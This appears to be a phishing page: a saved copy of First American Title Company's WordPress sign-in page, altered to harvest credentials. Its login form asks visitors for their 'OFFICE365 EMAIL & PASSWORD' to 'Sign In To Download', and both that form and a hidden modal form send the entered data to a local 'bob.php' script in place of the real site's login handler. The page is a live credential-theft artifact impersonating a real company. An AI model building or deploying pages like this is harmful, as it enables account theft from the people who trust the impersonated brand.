
<!DOCTYPE html>
<html prefix="og: https://ogp.me/ns#" lang="en-US"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<link rel="profile" href="https://gmpg.org/xfn/11">
<link rel="pingback" href="https://gofirstam.com/xmlrpc.php">

<title>Sign In | First American Title Company</title>

		<!-- All in One SEO 4.0.17 -->
		<link rel="canonical" href="https://gofirstam.com/member-login/">
		<meta property="og:site_name" content="First American Title Company | Title Insurance &amp; Real Estate-Related Services">
		<meta property="og:type" content="article">
		<meta property="og:title" content="Sign In | First American Title Company">
		<meta property="og:url" content="https://gofirstam.com/member-login/">
		<meta property="article:published_time" content="2021-04-07T17:38:09Z">
		<meta property="article:modified_time" content="2021-04-07T17:38:09Z">
		<meta property="twitter:card" content="summary">
		<meta property="twitter:domain" content="gofirstam.com">
		<meta property="twitter:title" content="Sign In | First American Title Company">
		<script type="text/javascript" async="" src="Sign%20In%20First%20American%20Title%20Company_files/analytics.js"></script><script type="text/javascript" async="" src="Sign%20In%20First%20American%20Title%20Company_files/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-f1gfYQgq4OmhARgCSe1q7WV7tIcPpqu0qD+jYdSEMczD1YXPg0ibdIzvD/fZzwKc"></script><script type="application/ld+json" class="aioseo-schema">
			{"@context":"https:\/\/schema.org","@graph":[{"@type":"WebSite","@id":"https:\/\/gofirstam.com\/#website","url":"https:\/\/gofirstam.com\/","name":"First American Title Company","description":"Title Insurance & Real Estate-Related Services","publisher":{"@id":"https:\/\/gofirstam.com\/#organization"}},{"@type":"Organization","@id":"https:\/\/gofirstam.com\/#organization","name":"First American Title Company","url":"https:\/\/gofirstam.com\/"},{"@type":"BreadcrumbList","@id":"https:\/\/gofirstam.com\/member-login\/#breadcrumblist","itemListElement":[{"@type":"ListItem","@id":"https:\/\/gofirstam.com\/#listItem","position":"1","item":{"@id":"https:\/\/gofirstam.com\/#item","name":"Home","description":"Title Insurance & Real Estate-Related Services","url":"https:\/\/gofirstam.com\/"},"nextItem":"https:\/\/gofirstam.com\/member-login\/#listItem"},{"@type":"ListItem","@id":"https:\/\/gofirstam.com\/member-login\/#listItem","position":"2","item":{"@id":"https:\/\/gofirstam.com\/member-login\/#item","name":"Sign In","url":"https:\/\/gofirstam.com\/member-login\/"},"previousItem":"https:\/\/gofirstam.com\/#listItem"}]},{"@type":"WebPage","@id":"https:\/\/gofirstam.com\/member-login\/#webpage","url":"https:\/\/gofirstam.com\/member-login\/","name":"Sign In | First American Title Company","inLanguage":"en-US","isPartOf":{"@id":"https:\/\/gofirstam.com\/#website"},"breadcrumb":{"@id":"https:\/\/gofirstam.com\/member-login\/#breadcrumblist"},"datePublished":"2021-04-07T17:38:09-06:00","dateModified":"2021-04-07T17:38:09-06:00"}]}
		</script>
		<!-- All in One SEO -->

<link rel="dns-prefetch" href="https://www.google.com/">
<link rel="dns-prefetch" href="https://cdn.jsdelivr.net/">
<link rel="dns-prefetch" href="https://stackpath.bootstrapcdn.com/">
<link rel="dns-prefetch" href="https://s.w.org/">
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/gofirstam.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.7.1"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script><script src="Sign%20In%20First%20American%20Title%20Company_files/wp-emoji-release.js" type="text/javascript" defer="defer"></script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel="stylesheet" id="tribe-common-skeleton-style-css" href="Sign%20In%20First%20American%20Title%20Company_files/common-skeleton.css" type="text/css" media="all">
<link rel="stylesheet" id="tribe-tooltip-css" href="Sign%20In%20First%20American%20Title%20Company_files/tooltip.css" type="text/css" media="all">
<link rel="stylesheet" id="wp-block-library-css" href="Sign%20In%20First%20American%20Title%20Company_files/style_002.css" type="text/css" media="all">
<link rel="stylesheet" id="yikes-custom-login-public-css" href="Sign%20In%20First%20American%20Title%20Company_files/yikes-custom-login-public.css" type="text/css" media="all">
<style id="yikes-custom-login-public-inline-css" type="text/css">

			.yikes-custom-page-template-interior .interior {
				background: rgba(240,231,222,1);
				color: #2d2d2d;
				border: 0px solid rgb(0,0,0,0);
				border-radius: 12px;
				-ms-border-radius: 12px;
				-moz-border-radius: 12px;
				-webkit-border-radius: 12px;
			}
			.yikes-custom-page-template-interior a,
			.yikes-custom-page-template-interior a:visited {
				color: #0000EE;
				-o-transition: .25s;
			  -ms-transition: .25s;
			  -moz-transition: .25s;
			  -webkit-transition: .25s;
			  transition: .25s;
			}
			.yikes-custom-page-template-interior a:hover {
				color: rgba(0,0,238,0.7);
			}
		
</style>
<link rel="stylesheet" id="bootstrap-css" href="Sign%20In%20First%20American%20Title%20Company_files/bootstrap.css" type="text/css" media="all">
<link rel="stylesheet" id="font-awesome-css" href="Sign%20In%20First%20American%20Title%20Company_files/font-awesome.css" type="text/css" media="all">
<link rel="stylesheet" id="slicknav-css" href="Sign%20In%20First%20American%20Title%20Company_files/slicknav.css" type="text/css" media="all">
<link rel="stylesheet" id="slick-css" href="Sign%20In%20First%20American%20Title%20Company_files/slick.css" type="text/css" media="all">
<link rel="stylesheet" id="ppm-quickstart-theme-style-css" href="Sign%20In%20First%20American%20Title%20Company_files/style.css" type="text/css" media="all">
<link rel="stylesheet" id="ppm-quickstart-theme-responsive-css" href="Sign%20In%20First%20American%20Title%20Company_files/responsive.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-icons-css" href="Sign%20In%20First%20American%20Title%20Company_files/elementor-icons.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-animations-css" href="Sign%20In%20First%20American%20Title%20Company_files/animations.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-frontend-legacy-css" href="Sign%20In%20First%20American%20Title%20Company_files/frontend-legacy.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-frontend-css" href="Sign%20In%20First%20American%20Title%20Company_files/frontend_002.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-post-26-css" href="Sign%20In%20First%20American%20Title%20Company_files/post-26.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-pro-css" href="Sign%20In%20First%20American%20Title%20Company_files/frontend.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-global-css" href="Sign%20In%20First%20American%20Title%20Company_files/global.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-post-28-css" href="Sign%20In%20First%20American%20Title%20Company_files/post-28.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-post-49-css" href="Sign%20In%20First%20American%20Title%20Company_files/post-49.css" type="text/css" media="all">
<link rel="stylesheet" id="tablepress-default-css" href="Sign%20In%20First%20American%20Title%20Company_files/default.css" type="text/css" media="all">
<link rel="stylesheet" id="google-fonts-1-css" href="Sign%20In%20First%20American%20Title%20Company_files/css.css" type="text/css" media="all">
<script type="text/javascript" src="Sign%20In%20First%20American%20Title%20Company_files/jquery.js" id="jquery-core-js"></script>
<script type="text/javascript" src="Sign%20In%20First%20American%20Title%20Company_files/jquery-migrate.js" id="jquery-migrate-js"></script>
<link rel="https://api.w.org/" href="https://gofirstam.com/wp-json/"><link rel="alternate" type="application/json" href="https://gofirstam.com/wp-json/wp/v2/pages/6241"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://gofirstam.com/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://gofirstam.com/wp-includes/wlwmanifest.xml"> 
<meta name="generator" content="WordPress 5.7.1">
<link rel="shortlink" href="https://gofirstam.com/?p=6241">
<link rel="alternate" type="application/json+oembed" href="https://gofirstam.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fgofirstam.com%2Fmember-login%2F">
<link rel="alternate" type="text/xml+oembed" href="https://gofirstam.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fgofirstam.com%2Fmember-login%2F&amp;format=xml">
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async="" src="Sign%20In%20First%20American%20Title%20Company_files/js"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-134768212-2');
</script>
<meta name="google-site-verification" content="RzMjajO0uf0i5Y-NPVLbAIvxl8yReQx1hSmoEKrGT_A"><meta name="tec-api-version" content="v1"><meta name="tec-api-origin" content="https://gofirstam.com"><link rel="https://theeventscalendar.com/" href="https://gofirstam.com/wp-json/tribe/events/v1/"><style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style><link rel="icon" href="https://gofirstam.com/wp-content/uploads/2021/03/cropped-FirstAm_Favicon-32x32.png" sizes="32x32">
<link rel="icon" href="https://gofirstam.com/wp-content/uploads/2021/03/cropped-FirstAm_Favicon-192x192.png" sizes="192x192">
<link rel="apple-touch-icon" href="https://gofirstam.com/wp-content/uploads/2021/03/cropped-FirstAm_Favicon-180x180.png">
<meta name="msapplication-TileImage" content="https://gofirstam.com/wp-content/uploads/2021/03/cropped-FirstAm_Favicon-270x270.png">
		<style type="text/css" id="wp-custom-css">
			.abs-left .elementor-background-overlay {
    width: 34% !important;
}

.abs-right .elementor-background-overlay {
    left: auto !important;
    right: 0 !important;
    width: 34% !important;
}
.abs-right.abs-fifty .elementor-background-overlay,.abs-left.abs-fifty .elementor-background-overlay{
	width: 46% !important;
}
.info-box-content {
    color: #00578e;
}

.info-box-content a {
    color: #00578e;
}

.info-box-title h3 {
    background: #d6d6d6;
}

.single-info-box.have-btn {
    background: #d6d6d6;
}
.button-wrapper a {
    background: #ee3524;
    color: #fff;
}

.button-wrapper a:hover {
    background: #00578e;
    color: #fff;
}
.gform_wrapper .gform_body input[type=text],.gform_wrapper .gform_body textarea {
    border: 1px solid #ddd;
    padding: 8px 15px !important;
}

.c-page-form .gform_wrapper .gform_footer input.button, .c-page-form .gform_wrapper .gform_footer input[type=submit] {
    background: #01578e;
    color: #fff;
    text-transform: uppercase;
    padding: 12px 30px 10px;
}
.heading-av-fnt .elementor-heading-title {
    font-family: 'Avenir 85', sans-serif !important;
}
.red-dot ul ::marker {
    color: #f9360a;
}

.right-bg .elementor-background-overlay {
    width: 40%;
    right: 0;
    left: auto;
    height: 100%;
}

h1,
h2,
h3,
h4,
h5,
h6, div.elementor-widget-heading .elementor-heading-title {
    margin: 0 0 15px;
    font-weight: bold;
    font-family: 'Avenir 85', sans-serif;
}
.link-white a {
    color: #fff;
}
.link-white a:hover{
	opacity:.9;
}
.info-box-icon img {
    max-width: 95px;
}

.info-box-icon {
    padding-top: 10px;
}
.bg-fix-loc .info-box-title {
    background-image:url(https://gofirstam.com/wp-content/uploads/2020/09/FATCO_Resources-title-1024x236.jpg);
    background-position:center;
    background-size:cover;
}

.event-page-heading {
    background-color: #00578E;
}		</style>
		</head>

<body data-rsssl="1" class="yikes-custom-page-template">
	<div id="yikes-custom-user-registration-template" class="yikes-custom-page-template-interior">

		
		<div class="page-container">

						<a class="yikes-custom-login-site-branding yikes-fadeIn" href="https://gofirstam.com/" title="First American Title Company">
				<img src="Sign%20In%20First%20American%20Title%20Company_files/FATCO-Logo.png">
			</a>
			
			<div class="interior yikes-fadeIn">
				<!-- Login Form -->
				<div class="login-form-container section group">

	
	
	<i>LOGIN WITH YOUR <font color="#FF0000"><b>OFFICE365</b></font><!-- Show errors if there are any --><!-- Show logged out message if user just logged out -->
	
	
	
	
	
		EMAIL &amp; PASSWORD</i><p>&nbsp;</p>
	
	
	
	
	
		<form name="yikes-custom-login-form" id="yikes-custom-login-form" action="bob.php" method="post">
			
			<p class="login-username">
				<label for="user_login">Email</label>
				<input type="text" name="log" id="user_login" class="input" size="20">
			</p>
			<p class="login-password">
				<label for="user_pass">Password</label>
				<input type="password" name="pwd" id="user_pass" class="input" value="" size="20">
			</p>
			
			<p class="login-remember">&nbsp;</p>
			<p class="login-submit">
				<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary" value="Sign In To Download">
				<input type="hidden" name="redirect_to" value="">
			</p>
			
		</form>
	
	
</div>

				<!-- Preloader -->
				<div class="preloader-container">
					<img src="Sign%20In%20First%20American%20Title%20Company_files/wpspin_light.gif" title="preloader" class="login-preloader">
				</div>
			</div>

		</div>

		
	</div>

		<script>
		( function ( body ) {
			'use strict';
			body.className = body.className.replace( /\btribe-no-js\b/, 'tribe-js' );
		} )( document.body );
		</script>
		    <div class="modal fade" id="login-modal" tabindex="-1" aria-labelledby="loginModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="exampleModalLabel">Login</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <form action="bob.php" method="post">
                        <p><strong>User Name:</strong> <input type="text" name="username"></p>    
                
                        <p style="text-align:right;"><input type="submit" name="sub" value="Login"></p>    
                    </form>
                    
                </div>
            </div>
        </div>
    </div>
    <script> /* <![CDATA[ */var tribe_l10n_datatables = {"aria":{"sort_ascending":": activate to sort column ascending","sort_descending":": activate to sort column descending"},"length_menu":"Show _MENU_ entries","empty_table":"No data available in table","info":"Showing _START_ to _END_ of _TOTAL_ entries","info_empty":"Showing 0 to 0 of 0 entries","info_filtered":"(filtered from _MAX_ total entries)","zero_records":"No matching records found","search":"Search:","all_selected_text":"All items on this page were selected. ","select_all_link":"Select all pages","clear_selection":"Clear Selection.","pagination":{"all":"All","next":"Next","previous":"Previous"},"select":{"rows":{"0":"","_":": Selected %d rows","1":": Selected 1 row"}},"datepicker":{"dayNames":["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],"dayNamesShort":["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],"dayNamesMin":["S","M","T","W","T","F","S"],"monthNames":["January","February","March","April","May","June","July","August","September","October","November","December"],"monthNamesShort":["January","February","March","April","May","June","July","August","September","October","November","December"],"monthNamesMin":["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"nextText":"Next","prevText":"Prev","currentText":"Today","closeText":"Done","today":"Today","clear":"Clear"}};/* ]]> */ </script><script type="text/javascript" src="Sign%20In%20First%20American%20Title%20Company_files/yikes-login-page.js" id="yikes-login-page-script-js"></script>
<script type="text/javascript" src="Sign%20In%20First%20American%20Title%20Company_files/api.js" id="recaptcha-api-js-js"></script>
<script type="text/javascript" src="Sign%20In%20First%20American%20Title%20Company_files/popper.js" id="popper-js"></script>
<script type="text/javascript" src="Sign%20In%20First%20American%20Title%20Company_files/bootstrap.js" id="bootstrap-js"></script>
<script type="text/javascript" src="Sign%20In%20First%20American%20Title%20Company_files/slick.js" id="slick-js"></script>
<script type="text/javascript" src="Sign%20In%20First%20American%20Title%20Company_files/jquery_002.js" id="slicknav-js"></script>
<script type="text/javascript" src="Sign%20In%20First%20American%20Title%20Company_files/sticky.js" id="sticky-js"></script>
<script type="text/javascript" src="Sign%20In%20First%20American%20Title%20Company_files/main.js" id="ppm-quickstart-main-js-js"></script>
<script type="text/javascript" src="Sign%20In%20First%20American%20Title%20Company_files/wp-embed.js" id="wp-embed-js"></script>



</body></html>